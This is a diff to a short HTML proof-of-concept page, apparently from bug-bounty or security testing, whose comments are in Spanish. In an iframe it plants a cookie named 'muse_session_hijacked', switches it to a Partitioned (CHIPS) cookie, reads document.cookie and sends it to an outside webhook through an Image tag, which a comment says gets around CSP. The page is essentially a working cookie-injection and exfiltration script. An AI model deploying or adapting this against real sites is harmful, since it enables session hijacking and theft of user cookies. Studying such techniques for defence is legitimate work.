@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h2>Cookie Test en GitHub Pages</h2>
+    <h2>Partitioned Cookie Test</h2>
     <pre id="log" style="background:#000; color:#0f0; padding:10px;"></pre>
 
     <script>
@@ -15,10 +15,10 @@
         log("Origen actual: " + window.location.origin);
         log("¿Es Top Frame? " + (window.self === window.top));
 
-        // 1. Escribimos una cookie en el dominio de GitHub Pages
+        // 1. Escribimos una cookie Partitioned (CHIPS)
         try {
-            document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; secure; SameSite=None";
-            log("✅ Cookie inyectada en " + window.location.hostname);
+            document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; secure; SameSite=None; Partitioned";
+            log("✅ Cookie Partitioned inyectada en el iframe");
         } catch (e) {
             log("❌ Error al inyectar: " + e.message);
         }
@@ -26,9 +26,9 @@
         // 2. Leemos las cookies
         log("Cookies actuales: " + document.cookie);
 
-        // 3. Exfiltramos al webhook
+        // 3. Exfiltramos al webhook (vía Image Tag, evita CSP)
         const img = new Image();
-        img.src = `${webhookUrl}?cookie_github=true&data=${encodeURIComponent(document.cookie)}`;
+        img.src = `${webhookUrl}?cookie_partitioned=true&data=${encodeURIComponent(document.cookie)}`;
         log("📤 Exfiltración enviada al webhook.");
     </script>
 </body>
